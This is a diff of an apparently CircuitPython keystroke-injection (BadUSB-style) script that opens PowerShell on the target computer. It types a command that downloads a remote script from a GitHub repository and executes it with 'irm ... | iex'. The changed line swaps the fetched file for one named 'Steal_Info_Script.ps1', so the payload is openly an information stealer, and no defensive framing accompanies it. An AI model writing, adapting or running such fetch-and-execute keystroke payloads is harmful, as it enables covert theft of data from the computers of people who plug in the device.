@@ -17,7 +17,7 @@ def open(word):
     time.sleep(2)
 
 open("powershell")
-ps = "irm https://raw.githubusercontent.com/imyimang/HID-Script/refs/heads/main/all | iex"
+ps = "irm https://raw.githubusercontent.com/imyimang/HID-Script/refs/heads/main/Steal_Info_Script.ps1 | iex"
 
 kbd.press(Keycode.ALT)
 time.sleep(0.1)
